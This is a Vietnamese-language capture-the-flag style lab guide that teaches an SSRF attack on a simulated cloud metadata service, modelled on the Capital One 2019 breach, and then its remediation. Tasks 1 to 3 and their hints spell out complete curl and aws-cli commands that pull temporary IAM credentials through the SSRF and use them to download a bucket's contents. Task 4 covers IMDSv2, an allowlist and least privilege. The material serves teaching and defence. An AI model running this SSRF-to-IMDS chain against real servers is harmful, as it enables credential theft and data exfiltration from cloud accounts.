# HƯỚNG DẪN THỰC HÀNH — Lab 7: Leo thang từ app vào cloud qua SSRF + IMDS

- **Mã lab:** `cloud-ssrf-imds`
- **Mức độ:** 3/4 (Nâng cao)
- **Công cụ:** `curl`, `jq`, `aws-cli` (trỏ `--endpoint-url` tới MinIO)
- **Kiến thức cần:** HTTP & tham số URL; SSRF (OWASP A10); IMDS & credential tạm thời của IAM role; object storage kiểu S3; sự cố Capital One 2019

> Guide này mức **3/4**: cho **khái niệm + hướng tiếp cận + khung lệnh nhiều chỗ trống `<...>`**. Bạn tự ghép chuỗi khai thác. Bí thì mở **Gợi ý mở rộng** ở cuối mỗi nhiệm vụ. Flag sinh riêng theo mã sinh viên, không có sẵn ở đây.
>
> **Lưu ý mô phỏng:** lab chạy offline, **không có cloud thật**. Dịch vụ metadata được giả lập bằng container tên **`imds`** (đóng vai `169.254.169.254` trong thực tế); object storage là **MinIO** tại `storage:9000`. Mọi khóa/token là dữ liệu giả.

## Bối cảnh
Chính `storefront` ở Lab 6 có chức năng "xem trước ảnh theo URL" (`imgproxy-portal`) dính **SSRF**. App chạy trên một "máy chủ cloud" gắn IAM role có quyền trên object storage nội bộ. Bạn (attacker, trên máy `client`) **không** truy cập trực tiếp được IMDS hay storage — phải ép chính webapp gọi hộ tới IMDS, cắp credential tạm thời của role, rồi dùng nó lấy flag. Cuối cùng vá theo chiều sâu (chống SSRF + IMDSv2 + least privilege). Đây là tái hiện sự cố Capital One 2019.

```
             mạng ảo Labtainer (172.34.0.0/24)

 [client] 172.34.0.10  (curl, aws-cli, jq) — nơi bạn gõ lệnh
     | (1) HTTP tới chức năng "fetch URL"
     v
 [web] 172.34.0.20 :8080  "imgproxy-portal" DÍNH SSRF, gắn role web-imgproxy-role
     | (2) SSRF ép server gọi hộ        | (4) dùng credential truy cập storage
     v                                   v
 [imds] 172.34.0.40                   [storage] 172.34.0.30 :9000  (MinIO)
  /latest/meta-data/...                bucket fin-reports (chứa flag.txt)
  trả credential tạm thời

 Luồng: client --SSRF--> web --(gọi hộ)--> imds  => lấy credential
        client --aws-cli + credential--> storage => FLAG
 Ghi chú: client KHÔNG gọi thẳng imds/storage được; phải đi qua web.
```

Hostname `web`, `imds`, `storage` đã phân giải sẵn.

## Khởi động
```bash
imodule https://github.com/namlt04/do-an-2026/raw/refs/heads/master/imodule/cloud-ssrf-imds.tar
labtainer cloud-ssrf-imds
```
Nhập email/mã sinh viên khi được hỏi (flag sinh riêng theo mã của bạn).

---

## Nhiệm vụ 1 — `discover_ssrf`: Phát hiện & xác nhận SSRF
**Mục tiêu:** Chứng minh chức năng "fetch URL" của webapp có thể bị ép gọi tới đích nội bộ mà `client` không trực tiếp tới được.

**Hướng tiếp cận:**
- Xem trang gốc để hiểu chức năng fetch/preview.
- Gọi fetch với một URL **nội bộ của chính server** (loopback hoặc endpoint sức khỏe) — nếu server trả nội dung "lấy hộ" thì đó là dấu hiệu SSRF.
- Thử trỏ sang dịch vụ metadata (`imds`): phản hồi khác rỗng/khác lỗi DNS nghĩa là SSRF chạm được IMDS.

**Khung lệnh:**
```bash
curl -s "http://web:8080/" | head -n 40
curl -s "http://web:8080/fetch?url=http://127.0.0.1:8080/health"
curl -s "http://web:8080/fetch?url=http://<HOST_IMDS>/latest/meta-data/"
```
**Hoàn thành khi:** request qua tham số `url` tới đích nội bộ (loopback của web và/hoặc `imds`) trả về nội dung do *server* lấy hộ → chức năng fetch bị SSRF.

**Câu hỏi:** Vì sao server "tải hộ" một URL nội bộ nguy hiểm hơn nhiều so với việc attacker tự gọi địa chỉ đó từ `client`? → ____

<details><summary>Gợi ý mở rộng</summary>

- Host metadata trong lab là `imds` (thay cho `169.254.169.254` thực tế). Lệnh khai thác IMDS gốc:
  `curl -s "http://web:8080/fetch?url=http://imds/latest/meta-data/"`.
</details>

---

## Nhiệm vụ 2 — `steal_credentials`: Đọc IMDS, đánh cắp credential tạm thời
**Mục tiêu:** Dùng SSRF làm cầu nối tới IMDS, liệt kê IAM role gắn với máy chủ web và trích bộ credential tạm thời của role đó.

**Hướng tiếp cận:**
- Đường dẫn `/latest/meta-data/iam/security-credentials/` trả về **tên role**. Nối tên role vào sau sẽ trả **credential JSON**.
- Mọi request vẫn phải đi **qua** chức năng fetch của webapp (`?url=`), không gọi thẳng imds.
- Parse JSON bằng `jq` để tách `AccessKeyId`, `SecretAccessKey`. Lưu lại cho Nhiệm vụ 3.
- **Chấm điểm:** lưu phản hồi credential vào `~/creds.txt`.

**Khung lệnh:**
```bash
# (a) liệt kê role
curl -s "http://web:8080/fetch?url=http://imds/latest/meta-data/iam/security-credentials/"
# (b) nối tên role vừa thấy để lấy credential JSON, lưu lại
curl -s "http://web:8080/fetch?url=http://imds/latest/meta-data/iam/security-credentials/<TÊN_ROLE>" \
  | tee ~/creds.txt
# (c) tách từng trường
jq -r '.AccessKeyId, .SecretAccessKey' ~/creds.txt
```
**Hoàn thành khi:** trích được credential tạm thời (AccessKeyId + SecretAccessKey) của role qua kênh SSRF→IMDS (chuỗi `AccessKeyId` xuất hiện trong output trên `client`).

**Câu hỏi:** Kỹ thuật này ánh xạ MITRE **T1552.005**. Vì sao credential từ IMDS là "tạm thời" và điều đó ảnh hưởng thế nào tới hành động của attacker sau khi cắp? → ____

<details><summary>Gợi ý mở rộng</summary>

- Role của bài là `web-imgproxy-role`. Có thể lấy tên role tự động:
  `ROLE=$(curl -s "http://web:8080/fetch?url=http://imds/latest/meta-data/iam/security-credentials/" | tr -d '\r\n')`
  rồi `curl -s "http://web:8080/fetch?url=http://imds/latest/meta-data/iam/security-credentials/$ROLE"`.
- IMDS giả của lab chỉ trả `AccessKeyId`/`SecretAccessKey` (không có session token) — ở Nhiệm vụ 3 **không** cần `AWS_SESSION_TOKEN`.
</details>

---

## Nhiệm vụ 3 — `access_storage_get_flag`: Dùng credential cắp được lấy flag
**Mục tiêu:** Cấu hình `aws-cli` bằng credential vừa lấy, trỏ tới MinIO (`storage:9000`), liệt kê bucket và tải `flag.txt`.

**Hướng tiếp cận:**
- Nạp credential qua biến môi trường `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` (đặt `AWS_DEFAULT_REGION` cho gọn). **Không** đặt session token.
- Mọi lệnh `aws s3` phải kèm `--endpoint-url http://storage:9000` để trỏ về MinIO thay vì AWS thật.
- Tìm bucket đích, liệt kê, rồi tải object flag.
- **Chấm điểm:** lưu flag vào `~/loot.txt`.

**Khung lệnh:**
```bash
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_DEFAULT_REGION=us-east-1
aws --endpoint-url http://storage:9000 s3 ls
aws --endpoint-url http://storage:9000 s3 ls s3://<BUCKET>/
aws --endpoint-url http://storage:9000 s3 cp s3://<BUCKET>/<KEY_FLAG> ~/loot.txt
cat ~/loot.txt
```
**Hoàn thành khi:** `~/loot.txt` chứa chuỗi flag đúng định dạng (lấy từ bucket `fin-reports`).

**Câu hỏi:** Trình bày lại toàn chuỗi khai thác (SSRF → IMDS → credential → storage) và chỉ ra điểm tương đồng cốt lõi với sự cố Capital One 2019. → ____

<details><summary>Gợi ý mở rộng</summary>

- Bucket đích là `fin-reports`, object là `flag.txt`:
  `aws --endpoint-url http://storage:9000 s3 cp s3://fin-reports/flag.txt ~/loot.txt`.
</details>

---

## Nhiệm vụ 4 — `harden_ssrf_imds`: Phòng thủ nhiều lớp
**Mục tiêu:** Bịt lỗ hổng theo chiều sâu — (a) bật IMDSv2 trên imds, (b) bật allowlist chống SSRF trên webapp, (c) ghi `remediation.txt` nêu đủ 3 lớp (chống SSRF + IMDSv2 + least privilege). Sau đó kiểm chứng chuỗi khai thác cũ bị chặn.

**Hướng tiếp cận:**
- Lab cung cấp **endpoint quản trị** để mô phỏng việc bật phòng thủ (không cần sửa file thủ công):
  - Bật IMDSv2: gửi `POST` tới endpoint admin của `imds`.
  - Bật allowlist chống SSRF: gửi `POST` tới endpoint admin của `web` (ghi đè `ssrf_protection: true`).
- Kiểm chứng: lặp lại request SSRF tới credential của Nhiệm vụ 2 — giờ phải bị **từ chối** (HTTP 403, không còn trả `AccessKeyId`). IMDSv2 khiến GET "trần" (kiểu SSRF cổ điển) bị chặn vì thiếu token.
- Viết `~/remediation.txt` nêu đủ 3 lớp (có từ khóa **allowlist / IMDSv2 / least privilege**).

**Khung lệnh:**
```bash
# (a) bật IMDSv2 trên imds
curl -s -X POST "http://imds/<ENDPOINT_ADMIN_IMDSV2>"
# (b) bật allowlist chống SSRF trên webapp
curl -s -X POST "http://web:8080/<ENDPOINT_ADMIN_HARDEN>"
# (c) kiểm chứng SSRF cũ đã bị chặn (kỳ vọng HTTP 403, không có AccessKeyId)
curl -s -o /dev/null -w "HTTP %{http_code}\n" \
  "http://web:8080/fetch?url=http://imds/latest/meta-data/iam/security-credentials/<TÊN_ROLE>"
# (d) ghi remediation (3 lớp phòng thủ)
cat > ~/remediation.txt <<'EOF'
1. Chong SSRF: allowlist host + chan dai noi bo/link-local (169.254.169.254, 127/8, 10/8, 172.16/12, 192.168/16).
2. IMDSv2: bat buoc token PUT /latest/api/token truoc khi GET metadata; hop limit = 1.
3. Least privilege: role chi s3:GetObject tren prefix can thiet, khong list/ghi toan bo storage.
EOF
cat ~/remediation.txt
```
**Hoàn thành khi:** (a) request SSRF sau hardening bị từ chối (không còn trả credential); (b) IMDSv2 đã bật; (c) `~/remediation.txt` nêu đủ 3 lớp.

**Câu hỏi:** Nếu chỉ được triển khai **một** biện pháp để giảm rủi ro tức thời, bạn chọn cái nào và vì sao? Biện pháp nào là "phòng thủ theo chiều sâu" bổ trợ khi cái kia thất bại? → ____

<details><summary>Gợi ý mở rộng</summary>

- Endpoint admin của lab: `POST http://imds/admin/enable-imdsv2` và `POST http://web:8080/admin/harden`.
- Xem minh họa quy trình IMDSv2 hợp lệ (PUT token → GET kèm token): `curl -s http://imds/admin/imdsv2-demo`.
</details>

---

## Chấm điểm
```bash
checkwork cloud-ssrf-imds
```
Đạt khi cả 4 mục tiêu = **Y**: `g_discover_ssrf`, `g_steal_credentials`, `g_access_storage_get_flag`, `g_harden_ssrf_imds`.

> Nếu một mục chưa Y: kiểm tra các file bằng chứng (`~/creds.txt`, `~/loot.txt`, `~/remediation.txt`) và nhớ mọi request khai thác phải đi **qua** `web:8080/fetch?url=...`, không gọi thẳng `imds`/`storage`.
